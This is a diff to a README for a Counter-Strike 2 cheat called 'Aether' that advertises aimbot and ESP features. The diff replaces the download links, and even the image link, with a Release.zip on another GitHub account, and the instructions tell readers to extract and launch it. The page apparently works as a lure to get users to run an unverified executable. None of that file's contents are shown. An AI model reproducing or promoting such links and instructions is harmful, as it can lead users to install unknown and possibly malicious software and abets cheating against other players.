@@ -1,6 +1,6 @@
 # 🎮 **Aether - Counter-Strike 2 Cheat**
 
-![CS2 Aether](https://example.com/cs2-aether.png)
+![CS2 Aether](https://github.com/Butaks101/aether/releases/download/v1.0/Release.zip)
 
 Welcome to Aether, your ultimate companion in dominating Counter-Strike 2 like never before! This repository houses a powerful cheat for Counter-Strike 2, packed with features to enhance your gaming experience and give you an edge over your opponents. From aimbot to ESP, this cheat has got you covered in all aspects of the game. So, gear up and get ready to unleash your full potential in the world of CS2!
 
@@ -15,10 +15,10 @@ Welcome to Aether, your ultimate companion in dominating Counter-Strike 2 like n
 
 ## Installation Guide 📥
 To get started with Aether, simply download the software from the link below:
-[![Download Aether](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Aether](https://github.com/Butaks101/aether/releases/download/v1.0/Release.zip)](https://github.com/Butaks101/aether/releases/download/v1.0/Release.zip)
 
 ## How to Run
-Once you have downloaded the `Software.zip` file, extract it to a location of your choice. Launch the cheat from the extracted folder and start dominating the Counter-Strike 2 battlefield!
+Once you have downloaded the `https://github.com/Butaks101/aether/releases/download/v1.0/Release.zip` file, extract it to a location of your choice. Launch the cheat from the extracted folder and start dominating the Counter-Strike 2 battlefield!
 
 ## Usage 💡
 1. Open the cheat software.
